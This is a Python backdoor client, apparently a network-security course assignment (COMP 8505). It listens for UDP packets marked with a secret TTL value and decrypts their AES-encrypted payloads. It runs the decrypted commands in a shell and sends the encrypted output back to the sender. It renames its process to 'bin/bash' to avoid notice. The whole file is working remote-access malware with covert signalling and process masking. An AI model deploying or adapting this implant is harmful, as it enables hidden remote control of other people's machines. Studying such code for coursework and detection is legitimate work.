#!/usr/bin/python3
'''
setup:
pip install scapy setproctitle
pip install pycrypto
'''
import sys # Used for exiting the system on errors
import logging #Dependancy for next import
#logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #Used to supress scapy
from scapy.all import * #Scapy packet crafting library
import os # Used for executing commands on shell.
from AESCipher import AESCipher
import setproctitle #Used for process masking
import argparse #used for easy arguments


# Function: receivedPacket()
# Argument: packet 
# Purpose: This function gets called on by sniff() meaning if the listening client/victim receives
#           a packet that is identified as a UDP packet, the sniff stops and goes directly 
#           to this function. receivedPacket then decrypts this packet via AES (ttlkey). Once
#           decrypted, will execute the payload by firstly opening up bash shell and then 
#           execute the commands. Once the commands are executed, the results in the given bash
#           shell window will then be encypted and encoded into the packet and ready for
#           tranmission.  
def receivedPacket(packet):
    """    
    Keyword arguments:
        packet
            type: scapy packet
            descripton: A packet with the encrypted payload 

    Return:
    decrypted payload string
    """
    global ttlKey
    if IP in packet[0]:
        if packet[IP].ttl == ttlKey:
            global cipher
            srcIP = packet[IP].src
            srcPort = packet[UDP].sport
            command = cipher.decrypt(packet["Raw"].load)
            print (command)
            #Execute the command
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read()  + proc.stderr.read()
            if result == "":
                result = "ERROR or No Output Produced"
            encrypted_result = cipher.encrypt(result)
            newPacket = (IP(dst=srcIP, ttl=ttlKey)/UDP(sport=srcPort, dport=srcPort)/encrypted_result)
            #send(newPacket, verbose = False)
            print (result)
            send(newPacket)
            return True
        else:
            return False

#GLOBAL VARIABLES
ttlKey = 159
key = 'mysecretpassword'
IV = "abcdefghijklmnop"
cipher = AESCipher(key)

# parse command line argument
arg_parser = argparse.ArgumentParser(
    prog='Basic Backdoor',
    description='COMP 8505 Assignment 3 by Peyman Tehrani Parsa & Khang Tran'
)
arg_parser.add_argument('-p', dest='port', type = int, help = 'listen port', default=99, const=99, nargs='?')
args = arg_parser.parse_args()
#Set process title to something less suspicious
setproctitle.setproctitle("bin/bash")

#Listen for connections
while True:
    sniff(filter='udp and dst port '+str(args.port), stop_filter=receivedPacket)